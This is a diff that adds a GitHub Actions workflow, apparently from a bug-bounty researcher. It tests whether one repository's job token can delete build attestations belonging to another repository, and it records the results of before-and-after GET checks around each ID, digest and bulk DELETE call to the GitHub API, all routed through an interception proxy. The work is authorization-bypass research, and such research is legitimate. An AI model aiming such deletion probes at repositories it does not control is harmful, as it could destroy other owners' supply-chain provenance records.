@@ -1,0 +1,217 @@
+name: Attestation repository-scope probe
+
+on:
+  workflow_dispatch:
+    inputs:
+      victim_id_attestation:
+        description: Victim attestation used for the ID deletion test
+        required: true
+        type: string
+      victim_id_digest:
+        description: Subject digest for the ID deletion victim
+        required: true
+        type: string
+      victim_digest_attestation:
+        description: Victim attestation used for the digest deletion test
+        required: true
+        type: string
+      victim_digest_digest:
+        description: Subject digest for the digest deletion victim
+        required: true
+        type: string
+      victim_bulk_attestation:
+        description: Victim attestation used for the bulk deletion test
+        required: true
+        type: string
+      victim_bulk_digest:
+        description: Subject digest for the bulk deletion victim
+        required: true
+        type: string
+
+permissions:
+  contents: read
+  id-token: write
+  attestations: write
+  artifact-metadata: write
+
+jobs:
+  probe:
+    runs-on:
+      - self-hosted
+      - attest-scope-source-20260729
+    env:
+      API_BASE: https://api.github.com
+      OWNER: jthack
+      SOURCE_REPO: github2-attest-scope-source-20260729
+      VICTIM_REPO: github2-attest-scope-victim-20260729
+      VICTIM_ID_ATTESTATION: ${{ inputs.victim_id_attestation }}
+      VICTIM_ID_DIGEST: ${{ inputs.victim_id_digest }}
+      VICTIM_DIGEST_ATTESTATION: ${{ inputs.victim_digest_attestation }}
+      VICTIM_DIGEST_DIGEST: ${{ inputs.victim_digest_digest }}
+      VICTIM_BULK_ATTESTATION: ${{ inputs.victim_bulk_attestation }}
+      VICTIM_BULK_DIGEST: ${{ inputs.victim_bulk_digest }}
+    steps:
+      - name: Create unique source subjects
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf 'source-id:%s:%s\n' "$GITHUB_RUN_ID" "$GITHUB_RUN_ATTEMPT" > source-id.bin
+          printf 'source-digest:%s:%s\n' "$GITHUB_RUN_ID" "$GITHUB_RUN_ATTEMPT" > source-digest.bin
+
+      - name: Attest same-repository ID control
+        id: source_id
+        uses: actions/attest@v4
+        with:
+          subject-path: source-id.bin
+          show-summary: false
+
+      - name: Attest same-repository digest control
+        id: source_digest
+        uses: actions/attest@v4
+        with:
+          subject-path: source-digest.bin
+          show-summary: false
+
+      - name: Run repository-scope matrix
+        shell: bash
+        env:
+          GH_JOB_TOKEN: ${{ github.token }}
+          SOURCE_ID_ATTESTATION: ${{ steps.source_id.outputs.attestation-id }}
+          SOURCE_DIGEST_ATTESTATION: ${{ steps.source_digest.outputs.attestation-id }}
+        run: |
+          set -euo pipefail
+          source_id_digest="sha256:$(shasum -a 256 source-id.bin | awk '{print $1}')"
+          source_digest_digest="sha256:$(shasum -a 256 source-digest.bin | awk '{print $1}')"
+          auth_config="$RUNNER_TEMP/attestation-auth.cfg"
+          results_ndjson="$RUNNER_TEMP/attestation-results.ndjson"
+          umask 077
+          {
+            printf 'header = "Authorization: Bearer %s"\n' "$GH_JOB_TOKEN"
+            printf 'header = "Accept: application/vnd.github+json"\n'
+            printf 'header = "X-GitHub-Api-Version: 2026-03-10"\n'
+          } > "$auth_config"
+          : > "$results_ndjson"
+
+          api_request() {
+            label="$1"
+            method="$2"
+            route_path="$3"
+            body="${4-}"
+            response_body="$RUNNER_TEMP/${label}.body"
+            response_headers="$RUNNER_TEMP/${label}.headers"
+            if [ -n "$body" ]; then
+              http_code="$(curl --silent --show-error \
+                --proxy http://127.0.0.1:8080 --insecure \
+                --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' \
+                --header 'X-Bug-Bounty: rez0' \
+                --header 'Content-Type: application/json' \
+                --config "$auth_config" \
+                --request "$method" \
+                --data-binary "$body" \
+                --dump-header "$response_headers" \
+                --output "$response_body" \
+                --write-out '%{http_code}' \
+                "${API_BASE}${route_path}")"
+            else
+              http_code="$(curl --silent --show-error \
+                --proxy http://127.0.0.1:8080 --insecure \
+                --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' \
+                --header 'X-Bug-Bounty: rez0' \
+                --config "$auth_config" \
+                --request "$method" \
+                --dump-header "$response_headers" \
+                --output "$response_body" \
+                --write-out '%{http_code}' \
+                "${API_BASE}${route_path}")"
+            fi
+            attestation_count="$(jq -r 'if (.attestations | type) == "array" then (.attestations | length) else -1 end' "$response_body" 2>/dev/null || printf '%s' -1)"
+            message="$(jq -r '.message // empty' "$response_body" 2>/dev/null || true)"
+            body_sha256="$(shasum -a 256 "$response_body" | awk '{print $1}')"
+            body_bytes="$(wc -c < "$response_body" | tr -d ' ')"
+            jq -cn \
+              --arg label "$label" \
+              --arg method "$method" \
+              --arg route "$route_path" \
+              --arg http_status "$http_code" \
+              --arg message "$message" \
+              --arg body_sha256 "$body_sha256" \
+              --argjson body_bytes "$body_bytes" \
+              --argjson attestation_count "$attestation_count" \
+              '{
+                label: $label,
+                method: $method,
+                route: $route,
+                http_status: ($http_status | tonumber),
+                attestation_count: $attestation_count,
+                message: $message,
+                body_bytes: $body_bytes,
+                body_sha256: $body_sha256
+              }' >> "$results_ndjson"
+          }
+
+          api_request same_id_before GET "/repos/$OWNER/$SOURCE_REPO/attestations/$source_id_digest"
+          api_request same_id_delete DELETE "/users/$OWNER/attestations/$SOURCE_ID_ATTESTATION"
+          api_request same_id_after GET "/repos/$OWNER/$SOURCE_REPO/attestations/$source_id_digest"
+
+          api_request same_digest_before GET "/repos/$OWNER/$SOURCE_REPO/attestations/$source_digest_digest"
+          api_request same_digest_delete DELETE "/users/$OWNER/attestations/digest/$source_digest_digest"
+          api_request same_digest_after GET "/repos/$OWNER/$SOURCE_REPO/attestations/$source_digest_digest"
+
+          api_request nonexistent_id_delete DELETE "/users/$OWNER/attestations/999999999999999999"
+          api_request wrong_owner_id_delete DELETE "/users/octocat/attestations/$VICTIM_ID_ATTESTATION"
+          api_request wrong_repo_list GET "/repos/$OWNER/$SOURCE_REPO/attestations/$VICTIM_ID_DIGEST"
+          api_request wrong_owner_list GET "/users/octocat/attestations/$VICTIM_ID_DIGEST"
+          api_request owner_victim_list GET "/users/$OWNER/attestations/$VICTIM_ID_DIGEST"
+
+          api_request cross_id_before GET "/repos/$OWNER/$VICTIM_REPO/attestations/$VICTIM_ID_DIGEST"
+          api_request cross_id_delete DELETE "/users/$OWNER/attestations/$VICTIM_ID_ATTESTATION"
+          api_request cross_id_after GET "/repos/$OWNER/$VICTIM_REPO/attestations/$VICTIM_ID_DIGEST"
+
+          api_request cross_digest_before GET "/repos/$OWNER/$VICTIM_REPO/attestations/$VICTIM_DIGEST_DIGEST"
+          api_request cross_digest_delete DELETE "/users/$OWNER/attestations/digest/$VICTIM_DIGEST_DIGEST"
+          api_request cross_digest_after GET "/repos/$OWNER/$VICTIM_REPO/attestations/$VICTIM_DIGEST_DIGEST"
+
+          bulk_body="$(jq -cn --arg digest "$VICTIM_BULK_DIGEST" '{subject_digests: [$digest]}')"
+          api_request cross_bulk_before GET "/repos/$OWNER/$VICTIM_REPO/attestations/$VICTIM_BULK_DIGEST"
+          api_request cross_bulk_delete DELETE "/users/$OWNER/attestations" "$bulk_body"
+          api_request cross_bulk_after GET "/repos/$OWNER/$VICTIM_REPO/attestations/$VICTIM_BULK_DIGEST"
+
+          jq -s \
+            --arg source_repository "$GITHUB_REPOSITORY" \
+            --arg victim_repository "$OWNER/$VICTIM_REPO" \
+            --arg run_id "$GITHUB_RUN_ID" \
+            --arg source_id_attestation "$SOURCE_ID_ATTESTATION" \
+            --arg source_id_digest "$source_id_digest" \
+            --arg source_digest_attestation "$SOURCE_DIGEST_ATTESTATION" \
+            --arg source_digest_digest "$source_digest_digest" \
+            --arg victim_id_attestation "$VICTIM_ID_ATTESTATION" \
+            --arg victim_id_digest "$VICTIM_ID_DIGEST" \
+            --arg victim_digest_attestation "$VICTIM_DIGEST_ATTESTATION" \
+            --arg victim_digest_digest "$VICTIM_DIGEST_DIGEST" \
+            --arg victim_bulk_attestation "$VICTIM_BULK_ATTESTATION" \
+            --arg victim_bulk_digest "$VICTIM_BULK_DIGEST" \
+            '{
+              source_repository: $source_repository,
+              victim_repository: $victim_repository,
+              run_id: $run_id,
+              source: {
+                id: {attestation_id: $source_id_attestation, subject_digest: $source_id_digest},
+                digest: {attestation_id: $source_digest_attestation, subject_digest: $source_digest_digest}
+              },
+              victim: {
+                id: {attestation_id: $victim_id_attestation, subject_digest: $victim_id_digest},
+                digest: {attestation_id: $victim_digest_attestation, subject_digest: $victim_digest_digest},
+                bulk: {attestation_id: $victim_bulk_attestation, subject_digest: $victim_bulk_digest}
+              },
+              results: .
+            }' "$results_ndjson" > attestation-scope-results.json
+          rm -f "$auth_config"
+          jq -c . attestation-scope-results.json
+
+      - name: Upload scope matrix
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: attestation-scope-results
+          path: attestation-scope-results.json
+          if-no-files-found: error
